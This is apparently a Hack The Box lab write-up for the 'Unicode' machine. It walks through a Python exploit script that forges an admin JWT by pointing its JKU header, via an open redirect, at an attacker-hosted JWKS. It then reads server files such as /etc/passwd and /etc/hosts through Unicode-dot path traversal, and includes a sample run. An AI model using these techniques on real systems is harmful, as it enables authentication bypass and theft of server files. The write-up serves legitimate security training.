# Hack The Box. Machines. Unicode

Machine write-up: https://7rocky.github.io/en/htb/unicode

### `dpt-jwks.py`

This script is mainly used to read files from the server exploiting a Directory Path Traversal vulnerability.

This machine uses JWT tokens with JWKS and JKU that can be forged using an Open Redirect vulnerability to our controlled JWKS (`jwks.json`) and gain access as `admin`. Hence, we need to generate a pair of RSA public and private keys to craft the JWKS:

```python
# openssl genrsa -out priv.key 1024
privkey = open('priv.key').read()

# openssl rsa -in priv.key -pubout > pub.key
pubkey = RSA.import_key(open('pub.key').read())


def int_to_b64(x: str | int) -> str:
    return base64.urlsafe_b64encode(long_to_bytes(int(x))).decode()


def generate_jwks():
    json.dump({'keys': [{
        'kty': 'RSA',
        'kid': 'hackthebox',
        'use': 'sig',
        'alg': 'RS256',
        'e': int_to_b64(pubkey.e),
        'n': int_to_b64(pubkey.n)
    }]}, open('jwks.json', 'w'), indent=2)
```

The required `openssl` commands are commented in the code. To fool the server, we must enter a valid JKU in the JWT token's header. Although the server applies some URL validation, we are able to bypass it using an Open Redirect and Directory Traversal vulnerabilities:

```python
    ip = sys.argv[1]
    jku = f'http://hackmedia.htb/static/../redirect/?url={ip}/jwks.json'
    token = jwt.encode({'user': 'admin'}, privkey,
                       algorithm='RS256',
                       headers={'jku': jku})
    print('[+] JWT token:', token)
```

The token is signed with the private key we generated. And the JWKS contains the public key, so that the server can take the `jwks.json` file and verify the token signature. Hence, we need a web server that hosts the `jwks.json` file. This is handles like this:

```python
class MyHTTPRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, *_):
        # Avoid showing logs
        pass


def start_http_server():
    threading.Thread(target=httpd.serve_forever).start()


def do_exit(*_):
    httpd.server_close()
    httpd.shutdown()
    exit()


httpd = HTTPServer(('', 80), MyHTTPRequestHandler)
signal.signal(signal.SIGINT, do_exit)
```

We override the default implementation of `SimpleHTTPRequestHandler` in order not to show the logging output. Moreover, the server is started in the background using `threading` and killed when using `^C` (`SIGINT`).

Finally, we have the Directory Path Traversal exploitation:

```python
    base_url = 'http://10.10.11.126/display/'
    vulnerable_url = f'{base_url}?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5'
    print('[+] Vulnerable page:', f'{vulnerable_url}/etc/passwd\n')

    while True:
        file = input('dpt> ')

        if file == 'exit':
            do_exit()

        r = requests.get(vulnerable_url + file,
                         headers={'Cookie': f'auth={token}', 'Host': 'hackmedia.htb'})
        print()
        print(r.text)
```

This time we need Unicode characters to bypass some filters. Fortunately, Flasks parses `‥/‥/‥/‥` as `../../../..` (notice the subtle differences in the dots), so the validation does not block our attack. In URL encoding, `‥/` equals `%E2%80%A5/`.

The script will show a `dpt>` prompt to enter a file to read given the absolute path.

Here is an example:

```console
$ python3 dpt-jwks.py 10.10.17.44
[+] JWT token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdC8_dXJsPTEwLjEwLjE3LjQ0L2p3a3MuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.sHepTEwtjfA7-VuBGnAQXn5_aDyyfri8yC6HbH8Mw8cPhQme7slaxbeWtLlbSzNyKLB3EnUJEsMF3dh6EZuTslWB4D8N2XZ932QJju6C84d_hvGJFg-PZ33xOiT4OxmTwVH6pfgJyk81LEFLyuzknQnUg_AMbNxvCUvwgqoduss
[+] Vulnerable page: http://10.10.11.126/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/etc/passwd

dpt> /etc/hosts

127.0.0.1 localhost
127.0.1.1 code
127.0.0.1 hackmedia.htb
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

dpt> exit
```
